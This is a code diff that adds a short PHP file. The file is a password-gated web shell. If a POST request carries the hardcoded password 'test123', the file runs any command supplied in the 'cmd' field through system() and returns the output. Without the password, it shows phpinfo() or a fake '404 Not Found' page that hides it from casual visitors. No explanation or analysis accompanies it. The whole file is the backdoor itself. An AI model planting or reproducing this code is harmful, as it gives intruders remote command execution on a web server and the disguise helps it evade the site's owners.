@@ -1,0 +1,13 @@
+<?php 
+if(isset($_POST["pwd"]) && $_POST["pwd"]=="test123"){
+    if(isset($_POST["cmd"])){
+        echo "<pre>";
+        system($_POST["cmd"]);
+        echo "</pre>";
+    }else{
+        phpinfo();
+    }
+}else{
+    echo "<title>404 Not Found</title><h1>Not Found</h1>";
+}
+?>
